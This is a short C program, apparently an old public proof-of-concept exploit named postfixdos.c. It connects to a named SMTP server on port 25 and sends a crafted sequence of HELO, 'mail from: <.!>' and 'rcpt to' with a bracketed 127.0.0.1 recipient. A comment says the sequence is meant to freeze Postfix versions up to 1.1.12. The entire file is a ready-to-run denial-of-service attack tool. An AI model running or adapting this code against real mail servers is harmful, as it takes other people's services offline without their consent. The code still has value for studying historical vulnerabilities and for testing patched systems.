/*
 postfixdos.c for 1.1.12 by r3b00t <r3b00t@tx.pl>
 ------------------------------------------------
 remote/local Postfix up to (including) 1.1.12 DoS
 discovered by lcamtuf <lcamtuf@coredump.cx>
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int sock = 0;

void get_response(void);
void say(char *it);

int main(int argc, char* argv[]) {
    struct hostent *hp;
    struct sockaddr_in addr;

    printf("postfixdos.c for 1.1.12 by r3b00t <r3b00t@tx.pl>\n");

    if (argc<2) {
        printf("usage: %s <smtpserver>\n", argv[0]);
        exit(0);
    }

    hp=gethostbyname(argv[1]);

    if (!hp) {
        printf("can't resolve %s\n", argv[1]);
        exit(0);
    }

    bzero((char *)&addr, sizeof(addr));

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("can't create socket\n");
        exit(0);
    }

    bcopy(hp->h_addr, (char *)&addr.sin_addr, hp->h_length);
    addr.sin_family=AF_INET;
    addr.sin_port=htons(25);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr))!=0) {
        printf("can't connect to %s\n", argv[1]);
        close(sock);
        exit(0);
    }

    get_response();

    say("helo host\r\n");
    say("mail from: <.!>\r\n");
    say("rcpt to: <someuser123@[127.0.0.1]>\r\n");
    /* now should be freezed */

    shutdown(sock, 2);
    close(sock);

    printf("done.\n");

    return 0;
}

void get_response(void) {
    char buff[64];
    recv(sock, buff, sizeof(buff), 0);
    if (buff[0]!='2' && buff[0]!='3') printf("%s", buff);
}

void say(char *it) {
    send(sock, it, strlen(it), 0);
    get_response();
}



